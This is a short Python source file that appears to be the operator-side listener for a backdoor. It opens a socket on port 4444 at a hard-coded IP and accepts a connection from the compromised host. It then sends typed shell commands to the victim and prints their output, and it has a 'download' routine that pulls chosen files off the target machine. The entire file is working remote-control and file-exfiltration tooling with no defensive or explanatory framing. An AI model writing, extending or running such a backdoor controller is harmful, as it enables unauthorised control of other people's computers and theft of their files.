import socket





#Test Push

def handle_command(client_socket):
    while True:
        # Receive commands from the user
        command = input("Enter a command: ")
        client_socket.sendall(command.encode())

        if command.lower() == "exit":
            print("Closing connection...")
            client_socket.close()
            server_socket.close()
            break

        elif command.lower() == "download":
                receive_file(client_socket)
        else:
            # For regular commands, print the output received from the target
            output = client_socket.recv(4096).decode()
            print(output)


# Function to receive file from the backdoor
def receive_file(client_socket):
    filename = input("Input the Filename: ")
    client_socket.send(filename.encode('utf-8'))

    msg = client_socket.recv(1024)
    if msg.decode('utf-8') == "File not found":
        print(msg)
        handle_command(client_socket)
    else:
        with open(filename, 'wb') as file:  # Open the file to save it locally
            while True:
               chunk = client_socket.recv(1024)

               if not chunk:
                   break

               file.write(chunk)
        print("File Downloaded!")




# Set up the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reuse the address
server_socket.bind(('192.168.199.133', 4444))  # Change to your IP and desired port
server_socket.listen(1)

print("Server listening...")

# Accept incoming connections
client_socket, address = server_socket.accept()
print(f"Connection from {address}")

# Start handling commands
handle_command(client_socket)

client_socket.close()
server_socket.close()